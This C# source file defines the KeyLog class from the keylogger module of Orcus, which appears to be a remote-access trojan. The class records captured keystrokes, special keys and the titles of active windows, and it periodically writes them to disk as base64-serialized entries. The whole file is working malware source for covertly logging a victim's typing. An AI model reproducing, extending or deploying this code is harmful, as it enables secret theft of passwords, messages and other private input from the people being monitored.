using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Threading;
using Orcus.Shared.NetSerializer;

namespace Orcus.Shared.Commands.Keylogger
{
    public class KeyLog
    {
        private readonly string _fileName;
        private readonly object _logEntriesLock = new object();
        private KeyLogEntry _currentEntry;
        private StringBuilder _stringBuilder;

        protected KeyLog(string fileName)
        {
            _fileName = fileName;
            LogEntries = new List<KeyLogEntry>();
        }

        protected KeyLog()
        {
        }

        public List<KeyLogEntry> LogEntries { get; set; }

        public event EventHandler Saved;

        public static KeyLog Create(string fileName)
        {
            return new KeyLog(fileName);
        }

        public static KeyLog Parse(string fileName)
        {
            var entries = new List<KeyLogEntry>();

            using (var fileStream = new FileStream(fileName, FileMode.Open, FileAccess.Read))
            using (var streamReader = new StreamReader(fileStream))
            {
                var serializer =
                    new Serializer(new[]
                    {
                        typeof (List<KeyLogEntry>), typeof (NormalText), typeof (SpecialKey),
                        typeof (StandardKey),
                        typeof (WindowChanged)
                    });

                while (!streamReader.EndOfStream)
                {
                    var line = streamReader.ReadLine();
                    if (string.IsNullOrEmpty(line))
                        continue;

                    try
                    {
                        entries.AddRange(serializer.Deserialize<List<KeyLogEntry>>(Convert.FromBase64String(line), 0));
                    }
                    catch (Exception)
                    {
                        // ignored
                    }
                }
            }

            return new KeyLog {LogEntries = entries};
        }

        public void WindowChanged(string title)
        {
            lock (_logEntriesLock)
            {
                if (_stringBuilder != null && _stringBuilder.Length > 0)
                {
                    ((NormalText) _currentEntry).Text = _stringBuilder.ToString();
                    _stringBuilder.Length = 0;
                }

                var entry = new WindowChanged(title);
                _currentEntry = entry;

                LogEntries.Add(entry);
            }

            CheckForWrite();
        }

        public void WriteSpecialKey(KeyLogEntry keyLogEntry)
        {
            lock (_logEntriesLock)
            {
                if (_stringBuilder != null && _stringBuilder.Length > 0)
                {
                    ((NormalText) _currentEntry).Text = _stringBuilder.ToString();
                    _stringBuilder.Length = 0;
                }

                _currentEntry = keyLogEntry;

                LogEntries.Add(keyLogEntry);
            }

            CheckForWrite();
        }

        public void WriteString(string s)
        {
            lock (_logEntriesLock)
            {
                if (_stringBuilder == null)
                    _stringBuilder = new StringBuilder();

                var textEntry = _currentEntry as NormalText;
                if (textEntry == null)
                {
                    _currentEntry = new NormalText();
                    LogEntries.Add(_currentEntry);
                    _stringBuilder.Length = 0;
                }

                _stringBuilder.Append(s);
            }

            CheckForWrite();
        }

        private void CheckForWrite()
        {
            if (LogEntries.Count > 50)
                new Thread(Save).Start(); //Important because we might be in the hook thread
        }

        public void Save()
        {
            if (LogEntries.Count == 0)
                return;

            lock (_logEntriesLock)
            {
                var serializer =
                    new Serializer(new[]
                    {
                        typeof (List<KeyLogEntry>), typeof (NormalText), typeof (SpecialKey),
                        typeof (StandardKey),
                        typeof (WindowChanged)
                    });

                Directory.CreateDirectory(Path.GetDirectoryName(_fileName));

                using (var fs = new FileStream(_fileName, FileMode.Append))
                using (var sw = new StreamWriter(fs))
                    sw.WriteLine(Convert.ToBase64String(serializer.Serialize(LogEntries)));

                LogEntries.Clear();
                Saved?.Invoke(this, EventArgs.Empty);
            }
        }
    }
}